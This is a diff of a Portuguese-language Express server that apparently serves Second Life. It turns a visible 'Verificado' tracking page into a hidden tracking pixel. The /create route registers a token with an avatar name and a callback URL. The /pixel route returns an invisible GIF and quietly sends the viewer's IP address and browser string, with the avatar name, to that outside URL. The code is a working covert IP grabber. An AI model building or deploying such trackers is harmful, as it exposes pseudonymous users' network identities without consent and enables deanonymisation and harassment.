@@ -1,16 +1,34 @@
 const express = require("express");
-
 const app = express();
+
 const PORT = process.env.PORT || 10000;
 
-app.get("/", (req, res) => {
-  res.send("Servidor online.");
-});
+const sessions = new Map();
 
-app.get("/track", async (req, res) => {
+app.get("/create", (req, res) => {
+  const t = req.query.t || "";
   const avatar = req.query.avatar || "";
   const nome = req.query.nome || "";
   const primurl = req.query.primurl || "";
+
+  if (!t || !primurl) {
+    return res.status(400).send("ERROR");
+  }
+
+  sessions.set(t, {
+    avatar,
+    nome,
+    primurl
+  });
+
+  console.log("Sessão criada:", t, nome);
+
+  res.send("OK");
+});
+
+app.get("/pixel", async (req, res) => {
+  const t = req.query.t || "";
+  const s = sessions.get(t);
 
   const forwarded = req.headers["x-forwarded-for"] || "";
   const ip =
@@ -20,41 +38,36 @@ app.get("/track", async (req, res) => {
 
   const navegador = req.headers["user-agent"] || "desconhecido";
 
-  if (primurl) {
+  if (s) {
     const retorno =
-      primurl +
-      "?acao=retorno" +
-      "&avatar=" + encodeURIComponent(avatar)
-      + "&nome=" + encodeURIComponent(nome)
+      s.primurl +
+      "?acao=retorno"
+      + "&avatar=" + encodeURIComponent(s.avatar)
+      + "&nome=" + encodeURIComponent(s.nome)
       + "&ip=" + encodeURIComponent(ip)
-      + "&navegador=" + encodeURIComponent(navegador);
+      + "&navegador=" + encodeURIComponent(navegador)
+      + "&token=" + encodeURIComponent(t);
 
     try {
       await fetch(retorno);
+      console.log("Retorno enviado:", s.nome, ip);
     } catch (e) {
-      console.log("Erro ao retornar para o prim:", e.message);
+      console.log("Erro:", e.message);
     }
+
+    sessions.delete(t);
   }
 
-  res.setHeader("Content-Type", "text/html; charset=utf-8");
+  const pixel = Buffer.from(
+    "R0lGODlhAQABAPAAAP///wAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw==",
+    "base64"
+  );
 
-  res.send(`
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-  <meta charset="UTF-8">
-  <title>Verificado</title>
-</head>
-<body style="margin:0;min-height:100vh;background:#08111f;color:white;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;text-align:center;">
-  <div>
-    <h1>✅ Verificado</h1>
-    <p>Você já pode voltar ao Second Life.</p>
-  </div>
-</body>
-</html>
-  `);
+  res.setHeader("Content-Type", "image/gif");
+  res.setHeader("Cache-Control", "no-store");
+  res.end(pixel);
 });
 
 app.listen(PORT, "0.0.0.0", () => {
-  console.log("Servidor rodando na porta " + PORT);
+  console.log("Servidor rodando");
 });
